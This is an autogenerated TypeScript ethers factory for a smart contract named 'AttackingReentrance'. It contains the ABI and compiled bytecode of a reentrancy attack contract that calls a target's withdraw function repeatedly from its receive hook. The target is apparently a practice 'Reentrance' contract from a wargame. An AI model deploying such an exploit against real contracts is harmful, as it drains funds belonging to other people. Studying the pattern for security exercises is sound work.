/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import {
  Signer,
  utils,
  Contract,
  ContractFactory,
  PayableOverrides,
} from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type {
  AttackingReentrance,
  AttackingReentranceInterface,
} from "../AttackingReentrance";

const _abi = [
  {
    inputs: [
      {
        internalType: "address payable",
        name: "_contractAddress",
        type: "address",
      },
    ],
    stateMutability: "payable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "amount",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "contractAddress",
    outputs: [
      {
        internalType: "contract Reentrance",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "hackContract",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    stateMutability: "payable",
    type: "receive",
  },
];

const _bytecode =
  "0x6080604052670de0b6b3a76400006002556040516102d13803806102d183398101604081905261002e91610053565b600080546001600160a01b0319166001600160a01b0392909216919091179055610083565b60006020828403121561006557600080fd5b81516001600160a01b038116811461007c57600080fd5b9392505050565b61023f806100926000396000f3fe6080604052600436106100385760003560e01c80637ca2474e1461004c578063aa8c217c14610054578063f6b4dfb41461007d57600080fd5b36610047576100456100b5565b005b600080fd5b610045610129565b34801561006057600080fd5b5061006a60025481565b6040519081526020015b60405180910390f35b34801561008957600080fd5b5060005461009d906001600160a01b031681565b6040516001600160a01b039091168152602001610074565b6000546001600160a01b0316318015801590610125576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561010c57600080fd5b505af1158015610120573d6000803e3d6000fd5b505050505b5050565b3460018190556000546040513060248201526001600160a01b03909116919060440160408051601f198184030181529181526020820180516001600160e01b031662362a9560e01b1790525161017f91906101ce565b60006040518083038185875af1925050503d80600081146101bc576040519150601f19603f3d011682016040523d82523d6000602084013e6101c1565b606091505b5050506101cc6100b5565b565b6000825160005b818110156101ef57602081860181015185830152016101d5565b818111156101fe576000828501525b50919091019291505056fea2646970667358221220116464b395e191ee6a367e4bbc030f19fce4fe9ad52068dfb45b767b0491ece464736f6c63430008090033";

type AttackingReentranceConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackingReentranceConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class AttackingReentrance__factory extends ContractFactory {
  constructor(...args: AttackingReentranceConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "AttackingReentrance";
  }

  deploy(
    _contractAddress: string,
    overrides?: PayableOverrides & { from?: string | Promise<string> }
  ): Promise<AttackingReentrance> {
    return super.deploy(
      _contractAddress,
      overrides || {}
    ) as Promise<AttackingReentrance>;
  }
  getDeployTransaction(
    _contractAddress: string,
    overrides?: PayableOverrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_contractAddress, overrides || {});
  }
  attach(address: string): AttackingReentrance {
    return super.attach(address) as AttackingReentrance;
  }
  connect(signer: Signer): AttackingReentrance__factory {
    return super.connect(signer) as AttackingReentrance__factory;
  }
  static readonly contractName: "AttackingReentrance";
  public readonly contractName: "AttackingReentrance";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackingReentranceInterface {
    return new utils.Interface(_abi) as AttackingReentranceInterface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): AttackingReentrance {
    return new Contract(address, _abi, signerOrProvider) as AttackingReentrance;
  }
}
